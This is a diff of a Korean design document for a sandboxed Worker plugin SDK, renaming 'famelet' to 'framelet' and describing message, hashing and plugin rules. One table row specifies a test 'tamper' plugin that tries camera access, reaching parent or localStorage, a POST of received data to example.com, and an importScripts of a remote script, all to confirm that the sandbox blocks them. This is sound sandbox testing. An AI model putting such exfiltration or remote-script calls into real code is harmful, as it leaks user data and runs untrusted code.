@@ -15,8 +15,8 @@
 
 ### 2.1 SDK와 플러그인은 TS 함수로 쓰고 `toString()`으로 Worker 문자열을 만든다
 
-- `sdk/sha256.ts`의 `sha256Pure(bytes)`, `sdk/runtime.ts`의 `installFameletSdk(scope, sha256Pure, options)`, `host/bootstrap.ts`의 `iframeBootstrap()`, 플러그인마다 `xxxPlugin(famelet, ...data)` 함수를 둔다. 모두 **바깥 스코프의 이름을 쓰지 않는다**(인자와 Worker·iframe 전역만). 숫자 상수(`SDK_INIT_TIMEOUT_MS`, 글자 한도)는 `options` JSON으로 넣는다.
-- Worker 소스 = `"use strict";` + `var __name = …;` + `(installFameletSdk)(self, (sha256Pure), 옵션 JSON);` + `(plugin)(self.famelet, 데이터 JSON);`(`sdk/source.ts`의 `buildWorkerSource`·`pluginCall`).
+- `sdk/sha256.ts`의 `sha256Pure(bytes)`, `sdk/runtime.ts`의 `installFrameletSdk(scope, sha256Pure, options)`, `host/bootstrap.ts`의 `iframeBootstrap()`, 플러그인마다 `xxxPlugin(framelet, ...data)` 함수를 둔다. 모두 **바깥 스코프의 이름을 쓰지 않는다**(인자와 Worker·iframe 전역만). 숫자 상수(`SDK_INIT_TIMEOUT_MS`, 글자 한도)는 `options` JSON으로 넣는다.
+- Worker 소스 = `"use strict";` + `var __name = …;` + `(installFrameletSdk)(self, (sha256Pure), 옵션 JSON);` + `(plugin)(self.framelet, 데이터 JSON);`(`sdk/source.ts`의 `buildWorkerSource`·`pluginCall`).
 - `__name` 줄: esbuild를 `keepNames`로 돌리면(tsx가 그렇다) 함수 본문에 모듈 수준 도우미 `__name(fn, "이름")` 호출이 들어간다. 옮긴 코드에는 그 도우미가 없어 `ReferenceError`가 났다(check-plugins에서 실제로 관측). 아무 일도 안 하는 같은 이름을 앞에 둔다. Vite 개발·빌드는 `keepNames`를 쓰지 않는다. 축소와 `keepNames`를 함께 쓰면 도우미 이름이 바뀌어 이 줄로 못 막으므로 그 조합은 쓰지 않는다.
 - 장점: `tsc`가 SDK·부트스트랩·플러그인을 검사하고, `scripts/check-plugins.ts`가 같은 문자열을 Node `vm`에서 돌린다. 원본(tsx, keepNames)과 esbuild 축소판(Vite 7 기본 target `chrome107, edge107, firefox104, safari16`) 둘 다 돌린다.
 
@@ -77,7 +77,7 @@
 - `onInit`·`onDelivery`는 마지막 등록이 이긴다. `init`은 처음 1번만. 핸들러 Promise가 2.5초 안에 끝나면 `ready`, 예외·시간 초과면 보내지 않는다. 핸들러가 없으면 바로 `ready`.
 - `ready` 전 `delivery`는 버린다. 메시지마다 따로 `해시 → ack → 핸들러`를 돌리고 핸들러를 기다려 다음 전달을 막지 않는다. Blob을 읽어 `crypto.subtle` → 실패하면 `sha256Pure`로 해시를 만들고(소문자 16진) **핸들러보다 먼저** `ack`. Blob 읽기·해시가 실패하면 ack도 핸들러 호출도 없다. 핸들러 예외는 삼킨다.
 - `result`: 받은 `deliveryId`에만, 1번만, `String(text).slice(0, 200)`, `source`는 `api`·`fallback`만. `reportViolation`: `attempt` 4종만, `String(target).slice(0, 512)`, 같은 `attempt + '\n' + 자른 target`은 1번. `ready` 전에도 보낼 수 있다.
-- SDK는 시작할 때 `scope.postMessage`를 붙잡아 쓰고, `self.famelet`은 고칠 수 없는 속성(얼린 객체)이다. 플러그인이 같은 Worker에서 이것을 우회할 수 있다는 점은 02-SSRD "지킬 수 없는 것" 그대로다.
+- SDK는 시작할 때 `scope.postMessage`를 붙잡아 쓰고, `self.framelet`은 고칠 수 없는 속성(얼린 객체)이다. 플러그인이 같은 Worker에서 이것을 우회할 수 있다는 점은 02-SSRD "지킬 수 없는 것" 그대로다.
 - 시험용 옵션(`forcePureHash`, `testAckMode: 'corrupt'`(받은 바이트의 `byte[0] ^= 0xff` 뒤 해시) `| 'suppress'`(ack 없음))은 호스트 옵션 `sdkTestOptionsFor`로만 넣는다. 제품 코드에서 넣는 곳은 없고 `/dev` 시험 페이지만 쓴다. 플러그인은 원래 같은 Worker에서 무엇이든 할 수 있으므로 이 옵션이 새 권한을 주지 않는다.
 
 ### 2.7 내보내는 것
@@ -111,7 +111,7 @@
 | --- | --- | --- |
 | 칼로리(`calorie.ts`) | `apiBase`가 null(비교 모드)이면 요청하지 않고 고정표. 아니면 `POST {apiBase}/api/calorie`, 본문 = 받은 Blob 그대로, `Content-Type: image/jpeg`, `x-label`은 core `X_LABEL_RE`(32자 이하)를 통과할 때만. 3초 타이머(`CALORIE_CLIENT_TIMEOUT_MS`)는 `fetch` 바로 전에 시작하고 같은 signal로 `res.text()`까지 덮는다. 200이고 첫 줄이 비어 있지 않으면 그 줄(`api`), 그 밖(비 200·빈 본문·중단·네트워크 오류·CSP 차단)은 고정표(`fallback`) | 남기지 않는다. 실패해도 `reportViolation`을 부르지 않는다(서버 장애가 HUD 빨강으로 보이지 않게, 02-SSRD "플러그인 SDK" 네트워크 행) |
 | 고정표 | `src/core/calorie.ts`의 `CALORIE_TABLE`·`X_LABEL_RE`·`X_LABEL_MAX`를 registry가 JSON 인자로 넣는다. Worker 안 규칙은 core `fallbackText`와 같고, 표 밖 문구는 core가 정한 "음식(종류 미상)"(`fallbackText('')`로 받아 넣는다). check-plugins가 여러 라벨로 core와 대조한다 | — |
-| 변조(`tamper.ts`) | `onInit`이 끝난 뒤(ready 다음) 4종을 차례로: `navigator.mediaDevices.getUserMedia`, `document`·`parent`·`top`·`localStorage`를 이름 그대로 평가(CSP에 `unsafe-eval`이 없어 `new Function`은 쓰지 않는다), `fetch('https://example.com/famelet-tamper', POST)`, `importScripts('https://example.com/famelet-tamper.js')`. 받은 조각도 같은 주소로 보내 본다 | 4종 각각 `reportViolation`. target에 본 결과를 적는다(`→ 없음`, `=ReferenceError`). 시도가 성공하면 target에 "차단 실패!"를 붙인다. fetch·script target은 URL이라 호스트가 목록과 대조한다 |
+| 변조(`tamper.ts`) | `onInit`이 끝난 뒤(ready 다음) 4종을 차례로: `navigator.mediaDevices.getUserMedia`, `document`·`parent`·`top`·`localStorage`를 이름 그대로 평가(CSP에 `unsafe-eval`이 없어 `new Function`은 쓰지 않는다), `fetch('https://example.com/framelet-tamper', POST)`, `importScripts('https://example.com/framelet-tamper.js')`. 받은 조각도 같은 주소로 보내 본다 | 4종 각각 `reportViolation`. target에 본 결과를 적는다(`→ 없음`, `=ReferenceError`). 시도가 성공하면 target에 "차단 실패!"를 붙인다. fetch·script target은 URL이라 호스트가 목록과 대조한다 |
 
 ## 3. 고르지 않은 방법
 
